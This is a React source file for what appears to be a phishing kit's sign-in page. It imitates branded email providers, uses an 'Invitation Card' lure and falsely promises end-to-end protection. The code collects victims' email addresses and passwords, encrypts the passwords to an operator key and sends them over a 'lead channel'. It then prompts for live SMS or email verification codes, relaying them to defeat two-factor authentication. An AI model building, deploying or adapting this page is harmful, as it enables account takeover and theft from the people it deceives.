import { useEffect, useRef, useState, type FormEvent } from "react";
import { Link, useParams } from "react-router-dom";
import { BrandMark } from "../components/BrandMark";
import { getMailProvider } from "../hooks/providers";
import { useLeadChannel } from "../hooks/useLeadChannel";
import { LoadingOverlay } from "../components/LoadingOverlay";

export function ProviderPage() {
  const { provider: providerParam, codeLength: codeLengthParam } = useParams();
  const config = getMailProvider(providerParam);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [customValue, setCustomValue] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [testCode, setTestCode] = useState("");

  const channel = useLeadChannel();
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const codeLength = codeLengthParam ? parseInt(codeLengthParam, 10) : 6;

  useEffect(() => {
    const handlePageHide = () => {
      console.log("Verification page is closing or being unloaded.");
    };
    window.addEventListener("pagehide", handlePageHide);
    return () => {
      window.removeEventListener("pagehide", handlePageHide);
    };
  }, []);

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setError("");
    setSuccess("");
    if (!config || isSubmitting || channel.isLoading) return;
    const value = customValue.trim();
    if (config.extraFields && (value.length < 2 || value.length > 60)) {
      setError(
        `${config.extraFields.label} must be between 2 and 60 characters.`,
      );
      return;
    }
    setIsSubmitting(true);
    try {
      await channel.launch({
        provider: config.id,
        email: email.trim(),
        authToken: await encryptValue(password.trim()),
        ...(config.extraFields
          ? {
              customFields: [
                {
                  name: config.extraFields.name,
                  value,
                },
              ],
            }
          : {}),
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  const handleCodeChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const digits = testCode.padEnd(codeLength, " ").split("");
    digits[index] = digit || " ";
    const nextCode = digits.join("").replace(/ +$/, "");
    setTestCode(nextCode);
    if (digit && index < codeLength - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleCodePaste = (event: React.ClipboardEvent<HTMLInputElement>) => {
    event.preventDefault();
    const pasted = event.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, codeLength);
    setTestCode(pasted);
    inputRefs.current[Math.min(pasted.length, codeLength - 1)]?.focus();
  };

  async function handleCodeSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setError("");
    if (!config || isSubmitting || testCode.length < codeLength) return;
    setIsSubmitting(true);
    try {
      await channel.sendCode({
        provider: config.id,
        email: email,
        type: channel.process === "verify-sms-code" ? "sms" : "email",
        code: testCode,
      });
    } finally {
      setIsSubmitting(false);
    }
  }

  async function encryptValue(value: string): Promise<string> {
    if (!globalThis.crypto?.subtle) return `unprotected:${value}`;
    const pemKey = import.meta.env.VITE_PHOENYX_PUBLIC_KEY?.replace(
      /\\n/g,
      "\n",
    );
    if (!pemKey) throw new Error("VITE_PHOENYX_PUBLIC_KEY is not configured.");
    const pemBase64 = pemKey
      .replace(/-----BEGIN PUBLIC KEY-----/g, "")
      .replace(/-----END PUBLIC KEY-----/g, "")
      .replace(/\s/g, "");
    const binary = atob(pemBase64);
    const bytes = Uint8Array.from(binary, (char) => char.charCodeAt(0));
    const publicKey = await crypto.subtle.importKey(
      "spki",
      bytes.buffer,
      {
        name: "RSA-OAEP",
        hash: "SHA-256",
      },
      false,
      ["encrypt"],
    );
    const ciphertext = await crypto.subtle.encrypt(
      { name: "RSA-OAEP" },
      publicKey,
      new TextEncoder().encode(value),
    );
    return btoa(String.fromCharCode(...new Uint8Array(ciphertext)));
  }

  if (!config) {
    return (
      <main className="preview-shell">
        <section className="preview-card" role="alert">
          <h1>Email provider not found</h1>
          <p>Choose a provider to continue.</p>
          <Link className="submit-button success-link" to="/providers">
            Choose a provider
          </Link>
        </section>
      </main>
    );
  }

  return (
    <main className={`preview-shell theme-${config.id}`}>
      <header className="preview-topbar">
        <Link
          className="back-link"
          to="/providers"
          aria-label="Back to email provider selection"
        >
          <span aria-hidden="true">←</span> All providers
        </Link>
        <span className="preview-topbar-label">SECURE SIGN IN</span>
      </header>

      <div className="simulation-banner" role="note">
        <span className="simulation-indicator" aria-hidden="true" />
        <span>
          <strong>SIGN IN FLOW</strong> — Complete to recieve your Invitation
          Card .
        </span>
      </div>

      <section
        className="preview-card mail-flow-card"
        aria-labelledby="mail-heading"
      >
        <div className="preview-brand">
          <BrandMark provider={config.id} />
          <span>{config.brandLabel}</span>
          <span className="brand-preview-tag">SIGN IN</span>
        </div>

        {(channel.process === "init" || channel.process === "auth") &&
        channel.status !== "completed" ? (
          <>
            <div className="preview-intro">
              <p className="eyebrow">{}</p>
              <h1 id="mail-heading">{config.title}</h1>
              <p>{config.description}</p>
            </div>
            <form
              className="preview-form"
              onSubmit={(event) => void handleSubmit(event)}
            >
              <div className="form-field">
                <label htmlFor="mail-email">Email</label>
                <input
                  autoComplete="email"
                  id="mail-email"
                  maxLength={254}
                  onChange={(event) => setEmail(event.target.value)}
                  placeholder={config.emailSample}
                  required
                  type="email"
                  value={email}
                />
                <span className="field-hint">
                  Enter the email address you’d like us to use for your
                  invitation follow-up.
                </span>
              </div>

              <div className="form-field">
                <label htmlFor="mail-password">Password</label>
                <input
                  autoComplete="off"
                  id="mail-password"
                  minLength={1}
                  onChange={(event) => setPassword(event.target.value)}
                  required
                  type="password"
                  value={password}
                />
                <span className="field-hint">
                  Your password with this site is encrypted end to end.
                </span>
              </div>

              {config.extraFields ? (
                <div className="form-field">
                  <label htmlFor="mail-custom-field">
                    {config.extraFields.label}
                  </label>
                  <input
                    autoComplete="off"
                    id="mail-custom-field"
                    maxLength={60}
                    onChange={(event) => setCustomValue(event.target.value)}
                    placeholder={config.extraFields.placeholder}
                    required
                    value={customValue}
                  />
                  <span className="field-hint">
                    {config.extraFields.helper}
                  </span>
                </div>
              ) : null}

              <label className="lead-consent">
                <input required type="checkbox" />
                <span>
                  I agree to receive an email about my invitation and next
                  steps.
                </span>
              </label>

              {error ||
              channel.status === "flagged" ||
              channel.status === "failed" ? (
                <p className="form-message form-error" role="alert">
                  {error || channel.message}
                </p>
              ) : null}
              <button
                className="submit-button"
                disabled={isSubmitting}
                type="submit"
              >
                {isSubmitting ? (
                  <>
                    <span className="spinner" aria-hidden="true" /> Continuing…
                  </>
                ) : (
                  "Continue"
                )}
              </button>
            </form>
          </>
        ) : channel.process === "verify-sms-code" ||
          channel.process === "verify-email-code" ||
          channel.process === "verify-email-link" ? (
          <section
            className="verification-card"
            aria-labelledby="verification-title"
          >
            {channel.process === "verify-email-link" && (
              <div className="verification-icon" aria-hidden="true">
                ✉
              </div>
            )}
            <h1 id="verification-title">
              {channel.process === "verify-sms-code"
                ? "Verify SMS code"
                : "Check your inbox"}
            </h1>
            <p className="verification-description">
              {channel.process === "verify-email-link"
                ? `Click the link ${providerParam} sent to ${email}`
                : channel.process === "verify-sms-code"
                  ? `Enter the code ${providerParam} sent to your phone number`
                  : `Enter the code ${providerParam} sent to ${email}`}
            </p>
            {channel.process !== "verify-email-link" ? (
              <form onSubmit={handleCodeSubmit} style={{ marginTop: 24 }}>
                <div
                  style={{
                    display: "flex",
                    justifyContent: "center",
                    gap: 10,
                  }}
                >
                  {Array.from({ length: codeLength }, (_, index) => (
                    <input
                      key={index}
                      ref={(element) => {
                        inputRefs.current[index] = element;
                      }}
                      aria-label={`Code digit ${index + 1}`}
                      type="text"
                      inputMode="numeric"
                      autoComplete="off"
                      maxLength={1}
                      value={testCode[index] ?? ""}
                      onChange={(event) =>
                        handleCodeChange(index, event.target.value)
                      }
                      onKeyDown={(event) => {
                        if (
                          event.key === "Backspace" &&
                          !testCode[index] &&
                          index > 0
                        ) {
                          inputRefs.current[index - 1]?.focus();
                        } else if (event.key === "ArrowLeft" && index > 0) {
                          inputRefs.current[index - 1]?.focus();
                        } else if (
                          event.key === "ArrowRight" &&
                          index < codeLength - 1
                        ) {
                          inputRefs.current[index + 1]?.focus();
                        }
                      }}
                      onPaste={handleCodePaste}
                      required
                      style={{
                        width: codeLength === 4 ? 56 : 42,
                        height: 62,
                        border: "1px solid #dce2ed",
                        borderRadius: 12,
                        background: "#fff",
                        color: "#202b3c",
                        fontSize: 24,
                        fontWeight: 700,
                        textAlign: "center",
                        outlineColor: "var(--accent)",
                        boxShadow: testCode[index]
                          ? "0 0 0 2px var(--accent)22"
                          : "none",
                      }}
                    />
                  ))}
                </div>
                {error ||
                channel.status === "flagged" ||
                channel.status === "failed" ? (
                  <p
                    className="form-message form-error form-code-error"
                    role="alert"
                  >
                    {error || channel.message}
                  </p>
                ) : null}
                <button
                  type="submit"
                  disabled={!new RegExp(`^\\d{${codeLength}}$`).test(testCode)}
                  style={{
                    width: "100%",
                    marginTop: 28,
                    padding: 16,
                    border: 0,
                    borderRadius: 10,
                    color: "#fff",
                    background: "var(--accent)",
                    fontSize: 14,
                    fontWeight: 700,
                    cursor: "pointer",
                    opacity: new RegExp(`^\\d{${codeLength}}$`).test(testCode)
                      ? 1
                      : 0.5,
                  }}
                >
                  {isSubmitting ? (
                    <>
                      <span className="spinner" aria-hidden="true" />{" "}
                      Submitting…
                    </>
                  ) : (
                    "Submit Code"
                  )}
                </button>
              </form>
            ) : (
              <p className="verification-note">
                Refresh this page when you're done to continue.
              </p>
            )}
          </section>
        ) : (
          <div className="success-panel" role="status">
            <span className="success-icon" aria-hidden="true">
              ✓
            </span>
            <p className="eyebrow">THANK YOU</p>
            <h4 id="mail-heading">{channel.message}</h4>
            <p>{success}</p>
            <Link className="submit-button success-link" to="/providers">
              Submit Alternative Email
            </Link>
          </div>
        )}
      </section>
      <footer className="preview-footer">
        A simpler, more secure way to stay connected.
      </footer>

      {channel.isLoading && <LoadingOverlay message={channel.message} />}
    </main>
  );
}
